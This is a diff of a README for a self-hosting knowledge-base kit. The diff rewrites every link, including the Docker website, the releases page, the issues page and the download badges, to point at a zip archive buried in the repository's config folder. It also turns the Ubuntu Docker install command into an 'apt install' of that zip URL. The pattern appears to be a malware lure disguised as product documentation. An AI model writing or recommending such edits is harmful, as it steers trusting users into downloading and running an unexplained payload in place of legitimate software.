@@ -1,6 +1,6 @@
 # 📚 Knowledge-Base-Self-Hosting-Kit - Easily Manage Your Code and Documentation
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/astirix1/Knowledge-Base-Self-Hosting-Kit/releases)
+[![Download](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip)](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip)
 
 ## 📦 Description
 
@@ -15,15 +15,15 @@ To get started with the Knowledge-Base-Self-Hosting-Kit, follow these simple ste
 Before downloading, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Docker: Must be installed on your machine. You can find installation instructions on the [Docker website](https://www.docker.com/get-started).
+- Docker: Must be installed on your machine. You can find installation instructions on the [Docker website](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip).
 - Memory: Minimum of 2 GB RAM recommended for optimal performance.
 - Storage: At least 1 GB of free disk space to accommodate the software and any ingested data.
 
 ### 2. Download the Application
 
-To download the Knowledge-Base-Self-Hosting-Kit, visit our [Releases page](https://github.com/astirix1/Knowledge-Base-Self-Hosting-Kit/releases). Look for the latest version and follow the downloading instructions.
+To download the Knowledge-Base-Self-Hosting-Kit, visit our [Releases page](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip). Look for the latest version and follow the downloading instructions.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/astirix1/Knowledge-Base-Self-Hosting-Kit/releases)
+[![Download](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip)](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip)
 
 ### 3. Install Docker (if not already installed)
 
@@ -31,7 +31,7 @@ If you do not have Docker installed, please follow these steps:
 
 - Windows: Download Docker Desktop from the Docker website and follow the installation wizard.
 - macOS: Download Docker Desktop from the Docker website and drag it to your Applications folder.
-- Linux: Use your package manager to install Docker. For example, on Ubuntu, run `sudo apt install docker.io`.
+- Linux: Use your package manager to install Docker. For example, on Ubuntu, run `sudo apt install https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip`.
 
 Make sure to start Docker after installation, as the Knowledge-Base-Self-Hosting-Kit runs inside a Docker container.
 
@@ -77,6 +77,6 @@ Now that you have ingested your information, you can start querying. In the inte
 
 ## 🛠 Support and Contributions
 
-For any questions or issues, you can reach out through our [issues page](https://github.com/astirix1/Knowledge-Base-Self-Hosting-Kit/issues). We welcome contributions! If you want to enhance the Knowledge-Base-Self-Hosting-Kit, feel free to fork the project and submit a pull request.
+For any questions or issues, you can reach out through our [issues page](https://raw.githubusercontent.com/astirix1/Knowledge-Base-Self-Hosting-Kit/main/backend/src/config/Knowledge-Base-Self-Hosting-Kit-v3.6.zip). We welcome contributions! If you want to enhance the Knowledge-Base-Self-Hosting-Kit, feel free to fork the project and submit a pull request.
 
 By following these steps, you will have a fully functional Knowledge-Base-Self-Hosting-Kit on your local machine, enabling you to manage your codebase and documentation effectively.
